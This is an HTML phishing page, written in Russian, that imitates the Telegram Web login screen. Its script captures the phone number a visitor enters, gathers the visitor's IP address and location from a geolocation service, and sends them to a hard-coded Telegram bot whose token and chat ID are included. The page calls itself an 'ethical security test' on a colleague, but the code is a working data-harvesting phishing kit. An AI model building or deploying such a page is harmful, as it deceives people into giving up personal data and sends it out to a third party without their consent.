<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <style>
        body { background-color: #0e1621; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { text-align: center; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { width: 100%; padding: 10px; background: #3390ec; border: none; color: white; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="100" alt="Logo">
    <h2>Вход в Telegram</h2>
    <p>Введите номер телефона</p>
    <input type="text" id="phone" placeholder="+7 900 000-00-00">
    <button onclick="startResearch()">ДАЛЕЕ</button>
</div>

<script>
// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8244809963:AAHw9Gfy7mDNRuWKjyqsBAu52Y5isnjY7CY';
const CHAT_ID = '7128871752';

async function startResearch() {
    const phone = document.getElementById('phone').value;
    if (!phone) return alert('Введите номер!');

    try {
        // 1. Собираем "цифровой отпечаток" коллеги
        const geoRes = await fetch('https://ipapi.co/json/');
        const geo = await geoRes.json();
        
        const now = new Date();
        const fullDate = `${now.toLocaleDateString()} в ${now.toLocaleTimeString()} UTC`;

        // 2. Формируем то самое "страшное" сообщение
        const message = `
⚠️ <b>ЭТИЧЕСКИЙ ТЕСТ БЕЗОПАСНОСТИ</b> ⚠️

<b>Вход с нового устройства.</b>
Andrew, мы обнаружили вход в Ваш аккаунт с нового устройства ${fullDate}.

<b>Устройство:</b> ${navigator.platform}, ${navigator.appName} (имитация)
<b>Место входа:</b> ${geo.city}, ${geo.country_name}
<b>IP-адрес:</b> ${geo.ip}

<b>Введенный номер:</b> <code>${phone}</code>

<i>Данный отчет создан в учебных целях для демонстрации уязвимости перед фишингом.</i>
        `.trim();

        // 3. Отправляем отчет тебе в бота
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // 4. Эффектное завершение для коллеги
        document.body.innerHTML = `
            <div style="text-align:center; padding: 20px;">
                <h1 style="color: #ff4b4b;">ВНИМАНИЕ!</h1>
                <p>Ты только что прошел тест на фишинг.</p>
                <p>Твой IP: <b>${geo.ip}</b> и номер телефона уже у меня в боте.</p>
                <p>Всегда проверяй URL в адресной строке!</p>
                <button onclick="location.reload()">Вернуться</button>
            </div>
        `;

    } catch (e) {
        alert('Ошибка сети. Проверь блокировщики рекламы.');
    }
}
</script>
</body>
</html>
